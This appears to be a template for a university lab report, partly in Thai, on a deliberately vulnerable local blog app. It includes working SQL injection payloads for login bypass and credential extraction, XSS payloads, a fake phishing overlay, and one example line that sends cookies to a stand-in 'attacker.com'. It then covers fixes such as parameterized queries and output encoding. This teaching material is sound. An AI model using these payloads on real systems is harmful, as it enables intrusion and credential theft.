# Lab 7 Security Assessment Report
## Web Application Security - VulnBlog System

---

**Report Information**

| Field | Value |
|-------|-------|
| **Student Name** | [ชื่อ-นามสกุล] |
| **Student ID** | [รหัสนักศึกษา] |
| **Course** | ENGSE214 - Introduction to Cybersecurity |
| **Lab** | Lab 7: Web Application Security |
| **Assessment Date** | [วันที่ทำ Lab] |
| **Submission Date** | [วันที่ส่ง Report] |
| **Instructor** | [ชื่ออาจารย์] |

---

## 📋 Executive Summary

*[เขียนสรุปภาพรวมของ Lab นี้ 3-5 ประโยค]*

ในการทดสอบความปลอดภัยของระบบ VulnBlog ผู้ทดสอบได้พบช่องโหว่ความปลอดภัยที่สำคัญจำนวน [X] รายการ ซึ่งสามารถแบ่งออกเป็น...

**Key Findings:**
- 🔴 Critical: [จำนวน] findings
- 🟠 High: [จำนวน] findings  
- 🟡 Medium: [จำนวน] findings
- 🔵 Low: [จำนวน] findings

**Overall Risk Level:** [Critical / High / Medium / Low]

---

## 🔍 Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope of Assessment](#scope-of-assessment)
3. [Testing Methodology](#testing-methodology)
4. [Findings](#findings)
   - 4.1 [SQL Injection in Login](#41-sql-injection-in-login-form)
   - 4.2 [SQL Injection in Search](#42-sql-injection-in-search-feature)
   - 4.3 [Stored XSS in Comments](#43-stored-xss-in-comments)
   - 4.4 [Reflected XSS in Search](#44-reflected-xss-in-search)
5. [Remediation](#remediation)
6. [Code Improvements](#code-improvements)
7. [Verification Testing](#verification-testing)
8. [Recommendations](#recommendations)
9. [Conclusion](#conclusion)
10. [Appendices](#appendices)

---

## 🎯 Scope of Assessment

### Target System
- **Application:** VulnBlog - Vulnerable Blog System
- **Version:** 1.0
- **URL:** http://localhost:3000
- **Technology Stack:**
  - Backend: Node.js + Express.js
  - Database: SQLite3
  - Frontend: HTML5 + CSS3 + JavaScript

### Assessment Scope
- ✅ Authentication mechanisms
- ✅ Input validation
- ✅ Database interactions
- ✅ Output encoding
- ✅ Session management

### Out of Scope
- ❌ Infrastructure security
- ❌ Network security
- ❌ Physical security
- ❌ Social engineering

---

## 🔬 Testing Methodology

### Approach
การทดสอบใช้แนวทาง **Manual Penetration Testing** โดยอิงตาม **OWASP Testing Guide v4.2**

### Testing Timeline
```
วันที่ 1: Setup และ Initial Reconnaissance (2 ชั่วโมง)
วันที่ 2: Vulnerability Discovery (3 ชั่วโมง)
  • SQL Injection Testing
  • XSS Testing
  • Access Control Testing
วันที่ 3: Exploitation และ Documentation (2 ชั่วโมง)
วันที่ 4: Remediation และ Verification (3 ชั่วโมง)
```

### Tools Used
| Tool | Version | Purpose |
|------|---------|---------|
| Browser DevTools | Chrome 120 | Request/Response analysis |
| Burp Suite Community | 2023.10 | HTTP interception (optional) |
| SQLite Browser | 3.12 | Database inspection |
| VS Code | 1.85 | Code analysis & editing |

---

## 🚨 Findings

---

### 4.1 SQL Injection in Login Form

#### Classification
| Field | Value |
|-------|-------|
| **Vulnerability Type** | CWE-89: SQL Injection |
| **OWASP Top 10** | A03:2021 - Injection |
| **Severity** | 🔴 **Critical** |
| **CVSS v3.1 Score** | 9.8 (Critical) |
| **Exploitability** | Easy |
| **Impact** | Authentication Bypass, Data Breach |

---

#### Vulnerability Description

ระบบ Login Form ของ VulnBlog มีช่องโหว่ SQL Injection ที่ endpoint `/api/login` ซึ่งเกิดจากการใช้ **String Concatenation** ในการสร้าง SQL query โดยตรงโดยไม่มีการ validate หรือ sanitize input จากผู้ใช้

**Vulnerable Code Location:** `server.js` line 25-40

---

#### Technical Details

**Vulnerable Code:**
```javascript
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    // 🚨 VULNERABLE: String concatenation
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    
    db.get(query, (err, user) => {
        // ... authentication logic
    });
});
```

**Root Cause:**
1. ใช้ Template Literal (`${}`) ในการสร้าง SQL query
2. ไม่มีการ validate input จาก `req.body`
3. ไม่ใช้ Parameterized Query

---

#### Proof of Concept (PoC)

**Attack Scenario:**

1. เปิดหน้า Login: http://localhost:3000/login.html
2. ใส่ credentials ดังนี้:
   ```
   Username: admin' OR '1'='1' --
   Password: anything
   ```
3. กด Login

**Expected Behavior:** ระบบควร reject login attempt นี้

**Actual Behavior:** ระบบ authenticate สำเร็จและ login เข้าสู่ระบบในฐานะ admin

---

#### SQL Query Analysis

**Original Query (Normal Case):**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
```

**Injected Query (Attack Case):**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```

**Query Breakdown:**
```sql
SELECT * FROM users WHERE 
  username = 'admin'        -- ✅ Find user 'admin'
  OR '1'='1'               -- ✅ Always TRUE (bypass password check)
  --' AND password = ...   -- ❌ Commented out (ignored)
```

**Result:** Query always returns the first user (admin) without password verification.

---

#### Screenshot Evidence

**Figure 1: Successful Login Bypass**
```
[แนบ screenshot ของหน้า login ที่มี payload]
[แนบ screenshot ของ dashboard หลัง login สำเร็จ]
```

**Figure 2: Network Tab showing Request**
```
[แนบ screenshot ของ DevTools Network tab]
Request Payload:
{
  "username": "admin' OR '1'='1' --",
  "password": "anything"
}

Response:
{
  "success": true,
  "message": "Login successful",
  "username": "admin"
}
```

**Figure 3: Console Log showing Executed Query**
```
[แนบ screenshot ของ server console]
Login query: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```

---

#### Impact Assessment

**Immediate Impacts:**
1. **Authentication Bypass** - ผู้โจมตีสามารถ login ได้โดยไม่ต้องรู้ password
2. **Unauthorized Access** - เข้าถึงข้อมูลและฟังก์ชันที่ไม่ได้รับอนุญาต
3. **Account Takeover** - สามารถเข้าถึงบัญชีผู้ใช้คนอื่นได้

**Long-term Impacts:**
1. **Data Breach** - อาจนำไปสู่การรั่วไหลของข้อมูลผู้ใช้ทั้งหมด
2. **Reputation Damage** - ความเชื่อมั่นต่อระบบลดลง
3. **Compliance Violations** - ฝ่าฝืน PDPA และกฎหมายคุ้มครองข้อมูล

**Business Impact:**
- 🔴 Loss of customer trust
- 🔴 Potential data breach notifications required
- 🔴 Financial losses from incident response
- 🔴 Legal liabilities

---

#### Additional PoCs

**PoC 2: Login as Specific User**
```
Username: alice' --
Password: (ไม่สำคัญ)
```
Result: Login as alice without knowing her password

**PoC 3: Extract All Users**
```
Username: ' UNION SELECT group_concat(username||':'||password), NULL, NULL, NULL, NULL FROM users--
Password: (ไม่สำคัญ)
```
Result: เห็นรายชื่อและ password ของผู้ใช้ทั้งหมด

---

---

### 4.2 SQL Injection in Search Feature

#### Classification
| Field | Value |
|-------|-------|
| **Vulnerability Type** | CWE-89: SQL Injection (UNION-based) |
| **OWASP Top 10** | A03:2021 - Injection |
| **Severity** | 🔴 **Critical** |
| **CVSS v3.1 Score** | 9.1 (Critical) |
| **Exploitability** | Easy |
| **Impact** | Data Exfiltration, Database Enumeration |

---

#### Vulnerability Description

Search feature ที่ endpoint `/api/posts/search` มีช่องโหว่ SQL Injection แบบ UNION-based ที่ช่วยให้ผู้โจมตีสามารถ:
1. ดึงข้อมูลจาก tables อื่นๆ
2. Enumerate database schema
3. Extract sensitive data (usernames, passwords, emails)

---

#### Technical Details

**Vulnerable Code:**
```javascript
app.get('/api/posts/search', (req, res) => {
    const keyword = req.query.q || '';
    
    // 🚨 VULNERABLE: String concatenation in LIKE clause
    const query = `
        SELECT posts.*, users.username 
        FROM posts 
        JOIN users ON posts.user_id = users.id 
        WHERE posts.title LIKE '%${keyword}%' OR posts.content LIKE '%${keyword}%'
        ORDER BY posts.created_at DESC
    `;
    
    db.all(query, (err, posts) => {
        // ... handle results
    });
});
```

---

#### Exploitation Steps

**Step 1: Determine Number of Columns**
```sql
Search: ' ORDER BY 5--
Result: ✅ Works (5 columns exist)

Search: ' ORDER BY 6--
Result: ❌ Error (only 5 columns)
```

**Conclusion:** Query has 5 columns

---

**Step 2: Find Displayable Columns**
```sql
Search: ' UNION SELECT '1','2','3','4','5'--
```

**Screenshot:**
```
[แนบ screenshot ที่แสดงว่า column ไหนแสดงผลบนหน้าจอ]
```

**Result:** Columns 2, 3, 4 are displayed (title, content, username)

---

**Step 3: Extract Database Schema**
```sql
Search: ' UNION SELECT name,sql,'','','' FROM sqlite_master WHERE type='table'--
```

**Result:**
```
Table 1: users
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    email TEXT,
    bio TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)

Table 2: posts
[... schema ...]

Table 3: comments
[... schema ...]
```

---

**Step 4: Extract User Credentials**
```sql
Search: ' UNION SELECT id,username,password,email,'' FROM users--
```

**Screenshot:**
```
[แนบ screenshot ที่แสดง results ของ user data]
```

**Extracted Data:**
| ID | Username | Password | Email |
|----|----------|----------|-------|
| 1 | admin | admin123 | admin@vulnblog.com |
| 2 | alice | alice123 | alice@example.com |
| 3 | bob | bob123 | bob@example.com |

---

#### Impact Assessment

**Critical Findings:**
1. ✅ สามารถดึง username และ password ของผู้ใช้ทั้งหมด
2. ✅ Password ถูกเก็บแบบ **Plain Text** (ไม่ได้ hash)
3. ✅ สามารถดึงข้อมูลส่วนตัว (email, bio) ได้
4. ✅ สามารถ enumerate database structure ได้

**Business Impact:**
- 🔴 Complete database compromise
- 🔴 All user accounts at risk
- 🔴 Potential for further attacks using leaked credentials
- 🔴 GDPR/PDPA violations due to data breach

---

---

### 4.3 Stored XSS in Comments

#### Classification
| Field | Value |
|-------|-------|
| **Vulnerability Type** | CWE-79: Cross-Site Scripting (Stored) |
| **OWASP Top 10** | A03:2021 - Injection |
| **Severity** | 🔴 **High** |
| **CVSS v3.1 Score** | 8.1 (High) |
| **Exploitability** | Easy |
| **Impact** | Session Hijacking, Cookie Theft, Phishing |

---

#### Vulnerability Description

Comment system บน VulnBlog ไม่มีการ sanitize หรือ encode HTML content ก่อนแสดงผล ทำให้ผู้โจมตีสามารถ inject malicious JavaScript ที่จะ execute ทุกครั้งที่มีคนเปิดดู comment นั้น

---

#### Technical Details

**Vulnerable Code Location:** `public/post.html` line 150-165

**Vulnerable Code:**
```javascript
async function loadComments() {
    const response = await fetch(`/api/posts/${currentPostId}/comments`);
    const comments = await response.json();

    // 🚨 VULNERABLE: Direct innerHTML without encoding
    commentsList.innerHTML = comments.map(comment => `
        <div class="comment">
            <p class="comment-author">${escapeHtml(comment.username)}</p>
            <p class="comment-content">${comment.content}</p>  <!-- ❌ NOT ESCAPED! -->
        </div>
    `).join('');
}
```

**Root Cause:**
1. `comment.content` ถูก insert ลงใน HTML โดยตรง
2. ไม่มีการใช้ `escapeHtml()` function
3. Server-side ไม่มีการ sanitize ก่อนเก็บลง database

---

#### Proof of Concept

**PoC 1: Basic Alert**
```html
<script>alert('XSS Vulnerability!')</script>
```

**Steps:**
1. Login เข้าระบบ
2. เปิด post ใดก็ได้
3. Post comment ด้วย payload ข้างบน
4. Refresh หน้า

**Result:** Alert box ขึ้นทุกครั้งที่มีคนเปิดหน้านี้

**Screenshot:**
```
[แนบ screenshot ของ alert box]
[แนบ screenshot ของ comment ที่ถูก inject]
```

---

**PoC 2: Cookie Stealing**
```html
<script>
alert('Your session cookie: ' + document.cookie);
</script>
```

**Result:** แสดง session cookie ของ user ที่เปิดหน้า

**Screenshot:**
```
[แนบ screenshot ที่แสดง cookie]
```

**Real Attack Scenario:**
```html
<script>
// Send cookie to attacker's server
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

---

**PoC 3: Phishing Attack**
```html
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; padding:50px; text-align:center;">
    <h2 style="color:red;">⚠️ Session Expired</h2>
    <p>Please re-enter your password to continue:</p>
    <form>
        <input type="text" id="fake_user" placeholder="Username" style="padding:10px; margin:10px;"/><br>
        <input type="password" id="fake_pass" placeholder="Password" style="padding:10px; margin:10px;"/><br>
        <button type="button" onclick="alert('Stolen credentials: ' + document.getElementById('fake_user').value + ' / ' + document.getElementById('fake_pass').value)" style="padding:10px 20px; background:#667eea; color:white; border:none; cursor:pointer;">
            Login
        </button>
    </form>
</div>
```

**Result:** หน้าจอถูกปิดบังด้วย fake login form

**Screenshot:**
```
[แนบ screenshot ของ phishing page]
```

---

#### Impact Assessment

**Attack Scenarios:**
1. **Session Hijacking** - ขโมย session cookie เพื่อ impersonate user
2. **Credential Theft** - สร้าง fake form เพื่อขโมย username/password
3. **Malware Distribution** - redirect ไปยัง malicious site
4. **Defacement** - เปลี่ยนหน้าเว็บเป็นข้อความหมิ่นประมาท
5. **Keylogging** - บันทึกทุก keystroke ของเหยื่อ

**Why Stored XSS is More Dangerous:**
- ✅ Persistent - ไม่ต้องหลอกให้เหยื่อคลิก link
- ✅ Affects All Users - ทุกคนที่เข้าชมโดนโจมตี
- ✅ Trusted Context - execute ใน trusted domain
- ✅ Hard to Detect - ไม่มีใน URL bar

---

---

### 4.4 Reflected XSS in Search

#### Classification
| Field | Value |
|-------|-------|
| **Vulnerability Type** | CWE-79: Cross-Site Scripting (Reflected) |
| **OWASP Top 10** | A03:2021 - Injection |
| **Severity** | 🟠 **Medium** |
| **CVSS v3.1 Score** | 6.1 (Medium) |
| **Exploitability** | Easy |
| **Impact** | Phishing, Cookie Theft (requires social engineering) |

---

#### Vulnerability Description

Search feature แสดง search keyword กลับไปหาผู้ใช้โดยไม่มีการ encode HTML entities ทำให้สามารถ inject JavaScript ได้ผ่าน URL parameter

---

#### Technical Details

**Vulnerable Code:**
```javascript
async function searchPosts() {
    const keyword = document.getElementById('searchInput').value;
    const resultsDiv = document.getElementById('searchResults');
    
    // 🚨 VULNERABLE: keyword ไม่ได้ escape
    resultsDiv.innerHTML = `<p>Searching for: <strong>"${keyword}"</strong></p>`;
    
    // ... rest of code
}
```

---

#### Proof of Concept

**PoC 1: Basic XSS**
```
Search Input: <script>alert('Reflected XSS')</script>
```

**Result:** Alert box ขึ้นทันที

**Screenshot:**
```
[แนบ screenshot]
```

---

**PoC 2: Image-based XSS**
```html
<img src=x onerror="alert('XSS')">
```

**Result:** Alert ขึ้นเมื่อ image load fail

---

**PoC 3: Malicious URL**

Attacker สามารถสร้าง URL:
```
http://localhost:3000/?search=<script>alert('XSS')</script>
```

แล้วส่งให้เหยื่อคลิก → JavaScript execute ทันทีที่เปิด

---

#### Impact Assessment

**Attack Requirements:**
- ❌ Requires Social Engineering (ส่ง malicious link ให้เหยื่อคลิก)
- ✅ No persistence (execute เฉพาะครั้งที่คลิก link)

**Compared to Stored XSS:**
- Less severe because requires user interaction
- Still dangerous in targeted attacks
- Can be used in phishing campaigns

---

---

## 🛠️ Remediation

---

### 5.1 Fix SQL Injection

#### Solution 1: Parameterized Queries (Recommended)

**Before (Vulnerable):**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, (err, user) => { ... });
```

**After (Secure):**
```javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.get(query, [username, password], (err, user) => { ... });
```

**Why This Works:**
- Query structure กับ data แยกจากกัน
- Database engine จัดการ escaping อัตโนมัติ
- ไม่สามารถเปลี่ยนโครงสร้าง SQL ได้

---

#### Solution 2: Input Validation (Defense in Depth)

```javascript
function validateUsername(username) {
    // Only allow alphanumeric and underscore
    const regex = /^[a-zA-Z0-9_]{3,20}$/;
    if (!regex.test(username)) {
        throw new Error('Invalid username format');
    }
    return username;
}

// ใช้งาน
const safeUsername = validateUsername(req.body.username);
```

**Note:** Input validation เป็นชั้นป้องกันเสริม ไม่ใช่วิธีหลักในการป้องกัน SQLi

---

### 5.2 Fix Cross-Site Scripting (XSS)

#### Solution 1: Output Encoding

**Before (Vulnerable):**
```javascript
commentsList.innerHTML = comments.map(comment => `
    <p class="comment-content">${comment.content}</p>
`).join('');
```

**After (Secure) - Method A: escapeHtml()**
```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

commentsList.innerHTML = comments.map(comment => `
    <p class="comment-content">${escapeHtml(comment.content)}</p>
`).join('');
```

**After (Secure) - Method B: textContent**
```javascript
comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';
    
    const p = document.createElement('p');
    p.className = 'comment-content';
    p.textContent = comment.content;  // ✅ Safe!
    
    div.appendChild(p);
    commentsList.appendChild(div);
});
```

---

#### Solution 2: Content Security Policy

**Add to server.js:**
```javascript
app.use((req, res, next) => {
    // Prevent inline scripts
    res.setHeader('Content-Security-Policy', 
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:");
    
    // Other security headers
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    
    next();
});
```

---

### 5.3 Additional Security Improvements

#### Password Hashing (Bonus)

**Current:** Passwords stored in plain text 😱

**Solution:** Use bcrypt
```javascript
const bcrypt = require('bcrypt');

// Registration
app.post('/api/register', async (req, res) => {
    const { username, password, email } = req.body;
    
    // Hash password
    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);
    
    // Store hashed password
    const query = 'INSERT INTO users (username, password, email) VALUES (?, ?, ?)';
    db.run(query, [username, hashedPassword, email], ...);
});

// Login
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    const query = 'SELECT * FROM users WHERE username = ?';
    db.get(query, [username], async (err, user) => {
        if (user) {
            // Compare password with hash
            const match = await bcrypt.compare(password, user.password);
            if (match) {
                // Login successful
            }
        }
    });
});
```

---

## ✅ Verification Testing

### Before Fix - Vulnerability Confirmed

| Test Case | Result | Evidence |
|-----------|--------|----------|
| SQLi Login - `' OR '1'='1'--` | ✅ Exploitable | Screenshot A1 |
| SQLi Search - UNION SELECT | ✅ Exploitable | Screenshot A2 |
| XSS Comments - `<script>` | ✅ Exploitable | Screenshot A3 |
| XSS Search - Reflected | ✅ Exploitable | Screenshot A4 |

---

### After Fix - Vulnerabilities Mitigated

| Test Case | Result | Evidence |
|-----------|--------|----------|
| SQLi Login - `' OR '1'='1'--` | ❌ Not Exploitable | Screenshot B1 |
| SQLi Search - UNION SELECT | ❌ Not Exploitable | Screenshot B2 |
| XSS Comments - `<script>` | ❌ Not Exploitable | Screenshot B3 |
| XSS Search - Reflected | ❌ Not Exploitable | Screenshot B4 |

---

### Testing Evidence

**Test 1: SQL Injection - After Fix**
```
Input: admin' OR '1'='1' --
Expected: Login fails
Actual: Login fails ✅
Reason: Parameterized query treats input as literal string
```

**Screenshot:**
```
[แนบ screenshot ของ login failure]
[แนบ screenshot ของ server log showing safe query]
```

---

**Test 2: XSS - After Fix**
```
Input: <script>alert('XSS')</script>
Expected: Displayed as plain text
Actual: Shows as "<script>alert('XSS')</script>" ✅
Reason: HTML entities are escaped
```

**Screenshot:**
```
[แนบ screenshot ที่แสดง escaped HTML]
```

---

## 💡 Recommendations

### Immediate Actions (Priority: 🔴 Critical)

1. **Apply Code Fixes**
   - ✅ Deploy parameterized queries
   - ✅ Implement output encoding
   - ✅ Add security headers

2. **Password Security**
   - ✅ Hash all existing passwords (migration script)
   - ✅ Enforce strong password policy
   - ✅ Implement password reset mechanism

3. **Security Monitoring**
   - ✅ Log all authentication attempts
   - ✅ Monitor for suspicious patterns
   - ✅ Set up alerts for injection attempts

---

### Short-term Actions (Priority: 🟠 High)

1. **Code Review Process**
   - Implement peer code review
   - Use security-focused checklist
   - Train developers on secure coding

2. **Automated Security Testing**
   - Integrate SAST tools (ESLint security plugin)
   - Add DAST scanning (OWASP ZAP)
   - Set up CI/CD security gates

3. **Access Control**
   - Implement proper authorization checks
   - Add rate limiting
   - Implement CSRF protection

---

### Long-term Actions (Priority: 🟡 Medium)

1. **Security Culture**
   - Regular security training for developers
   - Bug bounty program
   - Incident response plan

2. **Architecture Improvements**
   - Consider using ORM (Sequelize, TypeORM)
   - Implement API gateway
   - Add Web Application Firewall (WAF)

3. **Compliance & Standards**
   - Follow OWASP ASVS guidelines
   - Regular penetration testing
   - Security certifications (ISO 27001)

---

## 🎯 Conclusion

### Summary of Findings

ระบบ VulnBlog มีช่องโหว่ความปลอดภัยที่สำคัญซึ่งสามารถนำไปสู่:
- การเข้าถึงระบบโดยไม่ได้รับอนุญาต (SQL Injection)
- การรั่วไหลของข้อมูลผู้ใช้ (Database Extraction)
- การขโมย session cookies (XSS)
- ความเสียหายต่อชื่อเสียงองค์กร

---

### Key Lessons Learned

1. **Never Trust User Input**
   - ทุก input ต้องถือว่าเป็นภัยคุกคาม
   - Validate และ sanitize ทุกครั้ง

2. **Defense in Depth**
   - ใช้หลายชั้นการป้องกันร่วมกัน
   - ไม่พึ่งพา mechanism เดียว

3. **Secure by Design**
   - ออกแบบความปลอดภัยตั้งแต่เริ่มต้น
   - ไม่ใช่แก้ไขหลังเกิดปัญหา

4. **Regular Security Testing**
   - ทดสอบความปลอดภัยเป็นประจำ
   - อัปเดต libraries และ frameworks

---

### Personal Reflection

*[เขียนข้อคิดเห็นส่วนตัวเกี่ยวกับสิ่งที่เรียนรู้]*

จาก Lab นี้ ผม/ดิฉัน ได้เรียนรู้...

---

### Acknowledgments

- **OWASP Foundation** - สำหรับ guidelines และ tools
- **ENGSE214 Course Team** - สำหรับ Lab materials
- **Classmates** - สำหรับ discussions และ knowledge sharing

---

## 📎 Appendices

### Appendix A: Testing Commands

```bash
# SQL Injection Payloads Used
admin' OR '1'='1' --
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT id,username,password,email,'' FROM users--

# XSS Payloads Used
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

---

### Appendix B: Code Changes Summary

| File | Lines Changed | Description |
|------|---------------|-------------|
| server.js | 25-40 | Parameterized query for login |
| server.js | 105-120 | Parameterized query for search |
| post.html | 150-165 | Output encoding for comments |
| index.html | 85-95 | Output encoding for search |
| server.js | 10-20 | Added security headers |

**Total Lines Changed:** ~50 lines

---

### Appendix C: References

1. OWASP Top 10:2021
   - https://owasp.org/Top10/

2. OWASP SQL Injection Prevention Cheat Sheet
   - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

3. OWASP XSS Prevention Cheat Sheet
   - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

4. CWE-89: SQL Injection
   - https://cwe.mitre.org/data/definitions/89.html

5. CWE-79: Cross-Site Scripting
   - https://cwe.mitre.org/data/definitions/79.html

---

### Appendix D: Timeline

| Date | Activity | Duration |
|------|----------|----------|
| 2024-02-10 | Setup & Installation | 1 hour |
| 2024-02-11 | Vulnerability Testing | 3 hours |
| 2024-02-12 | Code Fixes & Verification | 3 hours |
| 2024-02-13 | Report Writing | 2 hours |
| **Total** | | **9 hours** |

---

## 📜 Declaration

I, [ชื่อ-นามสกุล] (Student ID: [รหัสนักศึกษา]), hereby declare that:

1. This report represents my own work
2. All sources have been properly cited
3. Testing was conducted only on the lab environment
4. I understand the legal implications of unauthorized security testing
5. I agree to use this knowledge ethically and responsibly

**Signature:** ________________  
**Date:** ________________

---

**End of Report**

---

## 📋 Submission Checklist

Before submitting, make sure you have:

- [ ] Completed all sections of the report
- [ ] Included all required screenshots
- [ ] Provided before/after code comparison
- [ ] Tested all fixes and documented results
- [ ] Checked for typos and grammar
- [ ] Saved as PDF format
- [ ] Named file as: `lab7_report_[StudentID].pdf`
- [ ] Included all source code files in zip
- [ ] Verified zip file can be extracted

**Total File Size:** Should be < 50 MB

---

**Good luck with your submission! 🎯**
